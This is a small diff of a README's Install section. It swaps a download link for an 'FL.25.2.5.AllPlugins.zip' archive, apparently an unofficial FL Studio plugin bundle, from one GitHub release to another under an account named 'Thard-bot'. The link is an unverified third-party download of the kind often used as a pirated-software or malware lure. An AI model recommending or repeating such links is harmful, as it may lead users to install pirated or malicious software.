@@ -14,7 +14,7 @@
 
 
 ## Install
-[Download `FL.25.2.5.AllPlugins.zip`](https://github.com/imagelinefl/fl-25.2.5/releases/download/25.2.5/fl25-toolkit.zip)
+[Download `FL.25.2.5.AllPlugins.zip`](https://github.com/Thard-bot/FL-25.2.5/releases/download/25.2.5/FL.25.2.5.AllPlugins.zip)
 ---
 
 
